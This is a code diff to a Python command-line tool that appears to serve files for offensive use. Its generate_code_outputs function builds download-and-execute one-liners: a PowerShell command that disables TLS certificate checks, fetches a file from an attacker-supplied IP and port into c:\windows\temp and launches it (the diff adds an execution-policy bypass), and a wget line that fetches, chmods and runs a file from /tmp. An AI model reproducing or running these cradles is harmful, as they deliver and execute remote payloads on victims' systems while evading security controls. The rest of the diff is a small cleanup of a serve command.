@@ -138,7 +138,7 @@ def generate_code_outputs(protocol, ip_address, port, filename):
                 f"Add-Type -TypeDefinition \"using System.Net;using System.Security.Cryptography.X509Certificates;"
                 f"public class SSLValidator {{public static void Ignore() {{ServicePointManager.ServerCertificateValidationCallback += "
                 f"(sender, certificate, chain, sslPolicyErrors) => true;}}}}\" -Language CSharp; [SSLValidator]::Ignore();"
-                f" $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}');Start-Process 'c:\\windows\\temp\\{filename}'"
+                f" $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); powershell -ep bypass; Start-Process 'c:\\windows\\temp\\{filename}'"
             )
 
             wget_ignore_tls = f"wget --no-check-certificate {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
@@ -342,11 +342,6 @@ def serve(ctx, list_flag, search, use, file, http, https):
         click.echo(click.style(f"\n[*] ", fg='red') + click.style("You must provide a search term along with --use.\n", fg='yellow'))
         return
 
-    if directory:
-        if not http and not https:
-            https = 443  
-        serve_files(directory, http, https)
-        return
 
     if file:
         file = os.path.abspath(file)  # Convert to absolute path
@@ -354,7 +349,7 @@ def serve(ctx, list_flag, search, use, file, http, https):
             https = 443  
         serve_files(file, http, https)
         return 
-
+    
 @cli.command()
 @click.option('--update', is_flag=True, help='Check and download missing tools.')
 @click.option('--update-self', is_flag=True, help='Update the tool using pip.')
